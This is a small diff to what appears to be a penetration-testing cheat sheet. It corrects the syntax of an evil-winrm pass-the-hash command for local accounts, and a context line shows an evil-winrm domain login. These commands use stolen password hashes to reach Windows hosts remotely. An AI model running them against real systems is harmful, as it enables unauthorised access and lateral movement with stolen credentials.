@@ -13,7 +13,7 @@ evil-winrm -i <ip> -u <user>@<domain> -p <password>
 
 ## local account pth
 ```
-evil-winrm -i <ip>/<domain> -u <user> -H <hash>
+evil-winrm -i <ip> -u <user> -H <hash>
 ```
 
 ## domain account pth
